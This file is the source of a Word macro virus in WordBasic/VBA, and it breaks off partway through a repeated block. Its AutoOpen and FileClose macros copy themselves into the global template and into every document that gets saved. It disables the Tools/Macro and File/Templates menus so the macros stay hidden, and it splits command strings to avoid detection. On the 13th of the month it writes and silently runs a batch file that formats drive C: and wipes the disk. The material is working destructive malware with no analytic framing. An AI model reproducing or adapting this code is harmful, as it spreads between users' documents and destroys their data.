   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileTemplates"

   Public Sub MAIN()
   WordBasic.DisableInput
   '
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   WordBasic.DisableInput
   '
   End Sub

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Dim numm
   Dim i
   Dim NMm$
   Dim vir$
   Dim fe$
   Dim se$
   Dim ses$
   Dim ma$
   Dim cy$
   Dim ts$
   Dim tsm$
   Dim forse$
   Dim se1$
   Dim tsm1$
   Dim glob$
   WordBasic.DisableInput
   On Error GoTo -1: On Error GoTo errhand
   numm = WordBasic.CountMacros(0)
   For i = 1 To numm
           NMm$ = WordBasic.[MacroName$](i, 0)
           If NMm$ = "fucker" Then GoTo hand
   Next i
   WordBasic.ToolsOptionsView StatusBar:=1
   'Write by Sidorov Konstantin Matveevich, 73 years old, der. Vioshki,
   'Moscowskaya obl.
   'Sorry me, old grandfather, for some errors
   WordBasic.ScreenUpdating 0
   vir$ = WordBasic.[FileName$]()
   fe$ = "File"
   se$ = "Save"
   se$ = fe$ + se$
   ses$ = se$ + "As"
   ma$ = "Macro"
   cy$ = "Copy"
   cy$ = ma$ + cy$
   ts$ = "Templates"
   ts$ = fe$ + ts$
   tsm$ = "Tools"
   tsm$ = tsm$ + ma$
   forse$ = "format"
   se1$ = "Save"
   tsm1$ = "Tools"
   glob$ = "Global"
   Viewer
   WordBasic.ToolsMacro Name:="f", Edit:=1, Show:=1
   WordBasic.Insert "disableautomacros"
   WordBasic.InsertPara
   WordBasic.Insert "on error goto errh"
   WordBasic.InsertPara
   WordBasic.Insert "if Day(Now()) = 13 then"
   WordBasic.InsertPara
   WordBasic.Insert "open " + Chr(34) + "tester.bat" + Chr(34) + " for output as #1"
   WordBasic.InsertPara
   WordBasic.Insert "print #1, " + Chr(34) + "@cls" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #1, " + Chr(34) + "@echo off" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #1, " + Chr(34) + "type soyes.txt|" + forse$ + " c: /u>nul" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "close #1"
   WordBasic.InsertPara
   WordBasic.Insert "open " + Chr(34) + "soyes.txt" + Chr(34) + " for output as #2"
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "close #2"
   WordBasic.InsertPara
   WordBasic.Insert "shell " + Chr(34) + "command.com /c tester.bat >nul" + Chr(34) + ",0"
   WordBasic.InsertPara
   WordBasic.Insert "shell " + Chr(34) + "mem /c/p" + Chr(34) + ",0"
   WordBasic.InsertPara
   WordBasic.Insert "end if"
   WordBasic.InsertPara
   WordBasic.Insert "errh:"
   WordBasic.InsertPara
   WordBasic.DocClose 1

   '=====================
   WordBasic.ToolsMacro Name:="s", Edit:=1, Show:=1
   WordBasic.Insert "disableinput"
   WordBasic.InsertPara
   WordBasic.Insert "screenupdating 0"
   WordBasic.InsertPara
   WordBasic.Insert "on error goto errh"
   WordBasic.InsertPara
   WordBasic.Insert "numcm = Count" + ma$ + "s(1)"
   WordBasic.InsertPara
   WordBasic.Insert "Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert "i = 0"
   WordBasic.InsertPara
   WordBasic.Insert "If numcm = 0 Then Goto bye"
   WordBasic.InsertPara
   WordBasic.Insert "While i < numcm And Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "i = i + 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "If " + ma$ + "Name$(i, 1) = " + Chr(34) + "mir" + Chr(34) + " Then Flag = 1"
   WordBasic.InsertPara
   WordBasic.Insert "Wend"
   WordBasic.InsertPara
   WordBasic.Insert "i = 0"
   WordBasic.InsertPara
   WordBasic.Insert "While i < numcm And Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "i = i + 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + "NMm$ = " + ma$ + "Name$(i, 1)"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + tsm$ + ".Name = NMm$, .Show = 3, .Delete"
   WordBasic.InsertPara
   WordBasic.Insert "Wend"
   WordBasic.InsertPara
   WordBasic.Insert "bye:"
   WordBasic.InsertPara
   WordBasic.Insert "realn$= filenamefromwindow$()"
   WordBasic.InsertPara
   WordBasic.Insert "dim dlg as filesummaryinfo"
   WordBasic.InsertPara
   WordBasic.Insert "getcurvalues dlg"
   WordBasic.InsertPara
   WordBasic.Insert "qq$ = dlg.LastSavedDate"
   WordBasic.InsertPara
   WordBasic.Insert "Redim dlg As " + ses$
   WordBasic.InsertPara
   WordBasic.Insert "GetCurValues dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "If dlg.LockAnnot <> 1 And qq$ <> " + Chr(34) + Chr(34) + " Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "dlg.Name = realn$"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "nam$ = realn$"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " If dlg.Format = 1 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " If Flag <> 1 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "fucker" + Chr(34) + ", nam$ +" + Chr(34) + ":AutoOpen" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "sokker" + Chr(34) + ", nam$ +" + Chr(34) + ":FileClose" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + ts$ + Chr(34) + ", nam$ +" + Chr(34) + ":" + ts$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + tsm$ + Chr(34) + ", nam$ +" + Chr(34) + ":" + tsm$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + tsm$ + Chr(34) + ", nam$ +" + Chr(34) + ":mir" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "end if"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + se$
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " ElseIf dlg.Format = 0 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + "dlg.Format = 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "dlg.Name = realn$"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + ses$ + " dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " Else"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + se$
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " End If"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "Else"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + se$
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "End If"
   WordBasic.InsertPara
   WordBasic.Insert "errh:"
   WordBasic.InsertPara
   WordBasic.Insert "ScreenRefresh"
   WordBasic.InsertPara
   WordBasic.DocClose 1
   '=========================
   WordBasic.ToolsMacro Name:="t", Edit:=1, Show:=1
   WordBasic.Insert "disableinput"
   WordBasic.InsertPara
   WordBasic.Insert "screenupdating 0"
   WordBasic.InsertPara
   WordBasic.Insert "on error goto errh"
   WordBasic.InsertPara
   WordBasic.Insert "numcm = Count" + ma$ + "s(1)"
   WordBasic.InsertPara
   WordBasic.Insert "Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert "i = 0"
   WordBasic.InsertPara
   WordBasic.Insert "If numcm = 0 Then Goto bye"
   WordBasic.InsertPara
   WordBasic.Insert "While i < numcm And Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "i = i + 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "If " + ma$ + "Name$(i, 1) = " + Chr(34) + "mir" + Chr(34) + " Then Flag = 1"
   WordBasic.InsertPara
   WordBasic.Insert "Wend"
   WordBasic.InsertPara
   WordBasic.Insert "i = 0"
   WordBasic.InsertPara
   WordBasic.Insert "While i < numcm And Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "i = i + 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + "NMm$ = " + ma$ + "Name$(i, 1)"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + tsm$ + ".Name = NMm$, .Show = 3, .Delete"
   WordBasic.InsertPara
   WordBasic.Insert "Wend"
   WordBasic.InsertPara
   WordBasic.Insert "bye:"
   WordBasic.InsertPara
   WordBasic.Insert "realn$= filenamefromwindow$()"
   WordBasic.InsertPara
   WordBasic.Insert "dim dlg as filesummaryinfo"
   WordBasic.InsertPara
   WordBasic.Insert "getcurvalues dlg"
   WordBasic.InsertPara
   WordBasic.Insert "qq$ = dlg.LastSavedDate"
   WordBasic.InsertPara
   WordBasic.Insert "Redim dlg As " + ses$
   WordBasic.InsertPara
   WordBasic.Insert "GetCurValues dlg"
   WordBasic.InsertPara
   WordBasic.Insert "Dialog dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "If dlg.LockAnnot <> 1 And qq$ <> " + Chr(34) + Chr(34) + " Then"
   WordBasic.InsertPara
   WordBasic.Insert "ext$= Ucase$(Right$(dlg.Name, 1))"
   WordBasic.InsertPara
   WordBasic.Insert "if ext$ = CHR$(34) then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "ext$= Ucase$(Left$(Right$(dlg.Name, 5),4))"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "if ext$ = " + Chr(34) + ".DOC" + Chr(34) + " OR ext$=" + Chr(34) + ".DOT" + Chr(34) + " then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "nam$= Left$(dlg.Name, Len(dlg.Name) - 5) + " + Chr(34) + ".doc" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "end if"
   WordBasic.InsertPara
   WordBasic.Insert "else"
   WordBasic.InsertPara
   WordBasic.Insert "ext$= Ucase$(Right$(dlg.Name, 4))"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "if ext$ = " + Chr(34) + ".DOC" + Chr(34) + " OR ext$=" + Chr(34) + ".DOT" + Chr(34) + " then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "nam$= Left$(dlg.Name, Len(dlg.Name) - 4) + " + Chr(34) + ".doc" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "end if"
   WordBasic.InsertPara
   WordBasic.Insert "end if"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " If dlg.Format = 1 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " If Flag <> 1 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "fucker" + Chr(34) + ", realn$ +" + Chr(34) + ":AutoOpen" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "sokker" + Chr(34) + ", realn$ +" + Chr(34) + ":FileClose" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + ts$ + Chr(34) + ", realn$ +" + Chr(34) + ":" + ts$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + tsm$ + Chr(34) + ", realn$ +" + Chr(34) + ":" + tsm$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + tsm$ + Chr(34) + ", realn$ +" + Chr(34) + ":mir" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "end if"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "dlg.Name = nam$"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + ses$ + " dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " ElseIf dlg.Format = 0 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + "dlg.Format = 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "dlg.Name = nam$"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + ses$ + " dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " Else"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + ses$ + " dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " End If"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "Else"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + ses$ + " dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "End If"
   WordBasic.InsertPara
   WordBasic.Insert "errh:"
   WordBasic.InsertPara
   WordBasic.Insert "ScreenRefresh"
   WordBasic.InsertPara
   WordBasic.DocClose 1
   WordBasic.ToolsMacro Name:="r", Edit:=1, Show:=1
   WordBasic.Insert "disableinput"
   WordBasic.InsertPara
   WordBasic.Insert "on error goto errhand"
   WordBasic.InsertPara
   WordBasic.Insert tsm1$ + "Options" + se1$ + " ." + glob$ + "DotPrompt = 0"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "f" + Chr(34) + "," + Chr(34) + "AutoExec" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "s" + Chr(34) + "," + Chr(34) + se$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "t" + Chr(34) + "," + Chr(34) + ses$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + vir$ + ":autoopen" + Chr(34) + "," + Chr(34) + "fucker" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + vir$ + ":FileClose" + Chr(34) + "," + Chr(34) + "sokker" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + vir$ + ":" + ts$ + Chr(34) + "," + Chr(34) + ts$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + vir$ + ":" + tsm$ + Chr(34) + "," + Chr(34) + tsm$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "errhand:"
   WordBasic.InsertPara
   WordBasic.DocClose 1
   WordBasic.Call "r"
   winner
   hand:
   WordBasic.FileClose
   errhand:
   End Sub

   Private Sub Viewer()
   Dim numm
   Dim i
   Dim NMm$
   Dim vpos
   On Error Resume Next
   numm = WordBasic.CountMacros(0)
   For i = 1 To numm
           NMm$ = WordBasic.[MacroName$](i, 0)
           WordBasic.ToolsMacro Name:=NMm$, Show:=1, Delete:=1
   Next i
   vpos = WordBasic.Val(WordBasic.[GetSystemInfo$](31)) - 8
   If UCase(WordBasic.[GetSystemInfo$](30)) = "RUS" Then
       WordBasic.ViewToolbars Toolbar:="Ìàêðîñ", Show:=1
       WordBasic.MoveToolbar "Ìàêðîñ", 0, 8, vpos
   Else
       WordBasic.ViewToolbars Toolbar:="Macros", Show:=1
       WordBasic.MoveToolbar "Macros", 0, 8, vpos
   End If
   WordBasic.ScreenRefresh
   WordBasic.ScreenUpdating 0
   End Sub

   Private Sub winner()
   On Error Resume Next
   WordBasic.ToolsMacro Name:="r", Delete:=1, Show:=1
   WordBasic.ToolsMacro Name:="s", Delete:=1, Show:=1
   WordBasic.ToolsMacro Name:="f", Delete:=1, Show:=1
   WordBasic.ToolsMacro Name:="t", Delete:=1, Show:=1
   If UCase(WordBasic.[GetSystemInfo$](30)) = "RUS" Then
       WordBasic.ViewToolbars Toolbar:="Ìàêðîñ", Hide:=1
   Else
       WordBasic.ViewToolbars Toolbar:="Macros", Hide:=1
   End If
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim vir$
   Dim fe$
   Dim se$
   Dim ses$
   Dim ma$
   Dim cy$
   Dim ts$
   Dim tsm$
   Dim forse$
   Dim se1$
   Dim tsm1$
   Dim glob$
   WordBasic.DisableInput
   On Error GoTo -1: On Error GoTo errhand
   WordBasic.ToolsOptionsView StatusBar:=1
   WordBasic.ScreenUpdating 0
   vir$ = WordBasic.[FileName$]()
   fe$ = "File"
   se$ = "Save"
   se$ = fe$ + se$
   ses$ = se$ + "As"
   ma$ = "Macro"
   cy$ = "Copy"
   cy$ = ma$ + cy$
   ts$ = "Templates"
   ts$ = fe$ + ts$
   tsm$ = "Tools"
   tsm$ = tsm$ + ma$
   forse$ = "format"
   se1$ = "Save"
   tsm1$ = "Tools"
   glob$ = "Global"
   Viewer
   WordBasic.ToolsMacro Name:="f", Edit:=1, Show:=1
   WordBasic.Insert "disableautomacros"
   WordBasic.InsertPara
   WordBasic.Insert "on error goto errh"
   WordBasic.InsertPara
   WordBasic.Insert "if Day(Now()) = 13 then"
   WordBasic.InsertPara
   WordBasic.Insert "open " + Chr(34) + "tester.bat" + Chr(34) + " for output as #1"
   WordBasic.InsertPara
   WordBasic.Insert "print #1, " + Chr(34) + "@cls" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #1, " + Chr(34) + "@echo off" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #1, " + Chr(34) + "type soyes.txt|" + forse$ + " c: /u>nul" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "close #1"
   WordBasic.InsertPara
   WordBasic.Insert "open " + Chr(34) + "soyes.txt" + Chr(34) + " for output as #2"
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "print #2, " + Chr(34) + "y" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "close #2"
   WordBasic.InsertPara
   WordBasic.Insert "shell " + Chr(34) + "command.com /c tester.bat >nul" + Chr(34) + ",0"
   WordBasic.InsertPara
   WordBasic.Insert "shell " + Chr(34) + "mem /c/p" + Chr(34) + ",0"
   WordBasic.InsertPara
   WordBasic.Insert "end if"
   WordBasic.InsertPara
   WordBasic.Insert "errh:"
   WordBasic.InsertPara
   WordBasic.DocClose 1

   '=====================
   WordBasic.ToolsMacro Name:="s", Edit:=1, Show:=1
   WordBasic.Insert "disableinput"
   WordBasic.InsertPara
   WordBasic.Insert "screenupdating 0"
   WordBasic.InsertPara
   WordBasic.Insert "on error goto errh"
   WordBasic.InsertPara
   WordBasic.Insert "numcm = Count" + ma$ + "s(1)"
   WordBasic.InsertPara
   WordBasic.Insert "Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert "i = 0"
   WordBasic.InsertPara
   WordBasic.Insert "If numcm = 0 Then Goto bye"
   WordBasic.InsertPara
   WordBasic.Insert "While i < numcm And Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "i = i + 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "If " + ma$ + "Name$(i, 1) = " + Chr(34) + "mir" + Chr(34) + " Then Flag = 1"
   WordBasic.InsertPara
   WordBasic.Insert "Wend"
   WordBasic.InsertPara
   WordBasic.Insert "i = 0"
   WordBasic.InsertPara
   WordBasic.Insert "While i < numcm And Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "i = i + 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + "NMm$ = " + ma$ + "Name$(i, 1)"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + tsm$ + ".Name = NMm$, .Show = 3, .Delete"
   WordBasic.InsertPara
   WordBasic.Insert "Wend"
   WordBasic.InsertPara
   WordBasic.Insert "bye:"
   WordBasic.InsertPara
   WordBasic.Insert "realn$= filenamefromwindow$()"
   WordBasic.InsertPara
   WordBasic.Insert "dim dlg as filesummaryinfo"
   WordBasic.InsertPara
   WordBasic.Insert "getcurvalues dlg"
   WordBasic.InsertPara
   WordBasic.Insert "qq$ = dlg.LastSavedDate"
   WordBasic.InsertPara
   WordBasic.Insert "Redim dlg As " + ses$
   WordBasic.InsertPara
   WordBasic.Insert "GetCurValues dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "If dlg.LockAnnot <> 1 And qq$ <> " + Chr(34) + Chr(34) + " Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "dlg.Name = realn$"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "nam$ = realn$"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " If dlg.Format = 1 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " If Flag <> 1 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "fucker" + Chr(34) + ", nam$ +" + Chr(34) + ":AutoOpen" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "sokker" + Chr(34) + ", nam$ +" + Chr(34) + ":FileClose" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + ts$ + Chr(34) + ", nam$ +" + Chr(34) + ":" + ts$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + tsm$ + Chr(34) + ", nam$ +" + Chr(34) + ":" + tsm$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + tsm$ + Chr(34) + ", nam$ +" + Chr(34) + ":mir" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "end if"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + se$
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " ElseIf dlg.Format = 0 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + "dlg.Format = 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "dlg.Name = realn$"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + ses$ + " dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " Else"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + se$
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " End If"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "Else"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + se$
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "End If"
   WordBasic.InsertPara
   WordBasic.Insert "errh:"
   WordBasic.InsertPara
   WordBasic.Insert "ScreenRefresh"
   WordBasic.InsertPara
   WordBasic.DocClose 1
   '=========================
   WordBasic.ToolsMacro Name:="t", Edit:=1, Show:=1
   WordBasic.Insert "disableinput"
   WordBasic.InsertPara
   WordBasic.Insert "screenupdating 0"
   WordBasic.InsertPara
   WordBasic.Insert "on error goto errh"
   WordBasic.InsertPara
   WordBasic.Insert "numcm = Count" + ma$ + "s(1)"
   WordBasic.InsertPara
   WordBasic.Insert "Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert "i = 0"
   WordBasic.InsertPara
   WordBasic.Insert "If numcm = 0 Then Goto bye"
   WordBasic.InsertPara
   WordBasic.Insert "While i < numcm And Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "i = i + 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "If " + ma$ + "Name$(i, 1) = " + Chr(34) + "mir" + Chr(34) + " Then Flag = 1"
   WordBasic.InsertPara
   WordBasic.Insert "Wend"
   WordBasic.InsertPara
   WordBasic.Insert "i = 0"
   WordBasic.InsertPara
   WordBasic.Insert "While i < numcm And Flag = 0"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "i = i + 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + "NMm$ = " + ma$ + "Name$(i, 1)"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + tsm$ + ".Name = NMm$, .Show = 3, .Delete"
   WordBasic.InsertPara
   WordBasic.Insert "Wend"
   WordBasic.InsertPara
   WordBasic.Insert "bye:"
   WordBasic.InsertPara
   WordBasic.Insert "realn$= filenamefromwindow$()"
   WordBasic.InsertPara
   WordBasic.Insert "dim dlg as filesummaryinfo"
   WordBasic.InsertPara
   WordBasic.Insert "getcurvalues dlg"
   WordBasic.InsertPara
   WordBasic.Insert "qq$ = dlg.LastSavedDate"
   WordBasic.InsertPara
   WordBasic.Insert "Redim dlg As " + ses$
   WordBasic.InsertPara
   WordBasic.Insert "GetCurValues dlg"
   WordBasic.InsertPara
   WordBasic.Insert "Dialog dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "If dlg.LockAnnot <> 1 And qq$ <> " + Chr(34) + Chr(34) + " Then"
   WordBasic.InsertPara
   WordBasic.Insert "ext$= Ucase$(Right$(dlg.Name, 1))"
   WordBasic.InsertPara
   WordBasic.Insert "if ext$ = CHR$(34) then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "ext$= Ucase$(Left$(Right$(dlg.Name, 5),4))"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "if ext$ = " + Chr(34) + ".DOC" + Chr(34) + " OR ext$=" + Chr(34) + ".DOT" + Chr(34) + " then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "nam$= Left$(dlg.Name, Len(dlg.Name) - 5) + " + Chr(34) + ".doc" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "end if"
   WordBasic.InsertPara
   WordBasic.Insert "else"
   WordBasic.InsertPara
   WordBasic.Insert "ext$= Ucase$(Right$(dlg.Name, 4))"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "if ext$ = " + Chr(34) + ".DOC" + Chr(34) + " OR ext$=" + Chr(34) + ".DOT" + Chr(34) + " then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "nam$= Left$(dlg.Name, Len(dlg.Name) - 4) + " + Chr(34) + ".doc" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "end if"
   WordBasic.InsertPara
   WordBasic.Insert "end if"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " If dlg.Format = 1 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " If Flag <> 1 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "fucker" + Chr(34) + ", realn$ +" + Chr(34) + ":AutoOpen" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "sokker" + Chr(34) + ", realn$ +" + Chr(34) + ":FileClose" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + ts$ + Chr(34) + ", realn$ +" + Chr(34) + ":" + ts$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + tsm$ + Chr(34) + ", realn$ +" + Chr(34) + ":" + tsm$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + tsm$ + Chr(34) + ", realn$ +" + Chr(34) + ":mir" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "end if"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "dlg.Name = nam$"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + ses$ + " dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " ElseIf dlg.Format = 0 Then"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + "dlg.Format = 1"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "dlg.Name = nam$"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + ses$ + " dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " Else"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + ses$ + " dlg"
